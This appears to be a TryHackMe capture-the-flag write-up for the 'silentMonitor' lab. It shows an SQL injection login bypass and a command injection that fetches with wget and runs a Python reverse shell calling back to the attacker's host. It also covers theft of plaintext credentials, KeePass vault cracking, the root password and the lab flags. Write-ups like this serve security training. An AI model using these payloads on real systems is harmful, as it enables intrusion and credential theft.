# silentMonitor — TryHackMe Writeup

**Author:** Obito Uchiha — Team AKATSUKI
**Target:** `10.49.162.6`
**Category:** Web Exploitation → SQL Injection → Command Injection → Credential Harvesting → KeePass Cracking → Privilege Escalation

---

## 1. Reconnaissance

An Nmap scan revealed two open ports:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 |
| 5050/tcp | HTTP | Werkzeug 2.0.2 (Python 3.10.12) — "CorpNet — Network Operations Centre" |

With SSH offering no obvious foothold, the web service on port 5050 became the primary attack surface.

## 2. Directory Enumeration

```
ffuf -u http://10.49.162.6:5050/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

This uncovered a hidden path: `/internal`, which resolved to a login page for the NOC (Network Operations Centre) panel.

## 3. Authentication Bypass — SQL Injection

The login form was tested against classic SQLi bypass payloads:

- **Username:** `' OR 1=1-- -`
- **Password:** anything

This authenticated successfully and redirected to `/internal/dashboard`, confirming an unsanitized SQL query backing the login logic.

## 4. Session Token Analysis

An interesting endpoint, `/internal/health`, returned a Flask-signed session cookie:

```
eyJyb2xlIjoib3BlcmF0b3IiLCJ1c2VyIjoibmV0b3BzIn0.auitnw.-JZFyiEYVVjqDbVAqtFuNDgS69I
```

Base64-decoding the payload segment revealed:

```json
{"role":"operator","user":"netops"}
```

This confirmed the authenticated session belonged to an `operator`-role user named `netops`. An SSH brute-force attempt against this account failed, redirecting focus back to the web application.

## 5. Command Injection via `/internal/health`

The `/internal/health` endpoint accepted a `target` parameter intended for ICMP diagnostics (a ping utility). Testing with URL-encoded newline injection confirmed OS command injection:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell Delivery

A staged Python reverse shell was hosted locally:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.138.243",1122))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

Served via:
```
python3 -m http.server 8000
```

And triggered with the following injected request, chaining a ping, a `wget` download of the payload, and execution:

```
curl -i -s -X POST 'http://10.49.162.6:5050/internal/health' \
  -b 'session=eyJyb2xlIjoib3BlcmF0b3IiLCJ1c2VyIjoibmV0b3BzIn0.auitnw.-JZFyiEYVVjqDbVAqtFuNDgS69I' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'target=127.0.0.1%0awget%20192.168.138.243:8000/shell.py%20-O%20/tmp/s.py%0apython3%20/tmp/s.py'
```

A listener caught the callback:
```
nc -lnvp 1122
```

Resulting in a shell as `www-data`. The shell was stabilized with:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## 6. Lateral Movement — Credential Discovery

Inspecting the application's configuration file at `/opt/netops/secret.config` exposed a service account password left behind for a backup agent:

```ini
[backup_agent]
run_as   = sysadmin
password = S3cur3Backup$Acc3ss!
```

This credential was used to authenticate directly over SSH as `sysadmin`, yielding the first flag:

```
user.txt = THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
```

## 7. Privilege Escalation — KeePass Vault Cracking

The `sysadmin` home directory contained a `backups` folder with a KeePass database, `infrastructure.kdbx`. This was cracked offline using `KDBXcrack` against the `rockyou.txt` wordlist:

```
KDBXcrack -f infrastructure.kdbx -w /usr/share/wordlists/rockyou.txt
[+] Password | spring
```

With the vault password recovered, its contents were enumerated via `keepassxc-cli`:

```
keepassxc-cli ls -R infrastructure.kdbx
```

One entry stood out: **"Root User Password - Sensitive"**. Extracting it:

```
keepassxc-cli show -s --all infrastructure.kdbx "Root User Password - Sensitive"

UserName: root
Password: S3cur3P4ss0nK33p4ss
```

## 8. Root Access

With the recovered root password:

```
su root
```

Access was granted, yielding the final flag:

```
root.txt = THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
```

## 9. Summary

| Stage | Technique |
|-------|-----------|
| Initial access | SQL injection auth bypass on `/internal` login |
| Recon | JWT/Flask session decoding to identify backend user context |
| Foothold | OS command injection in `/internal/health` → reverse shell as `www-data` |
| Lateral movement | Hardcoded service-account credentials in a leftover config file |
| Privilege escalation | Offline KeePass vault cracking (`rockyou.txt`) → root password recovery |

**Root cause takeaways:** unsanitized SQL queries, unvalidated input passed to a shell-executed ping utility, plaintext secrets left in application configuration files, and weak master-password hygiene on a credential vault.

---
*Writeup by Obito Uchiha — Team AKATSUKI*
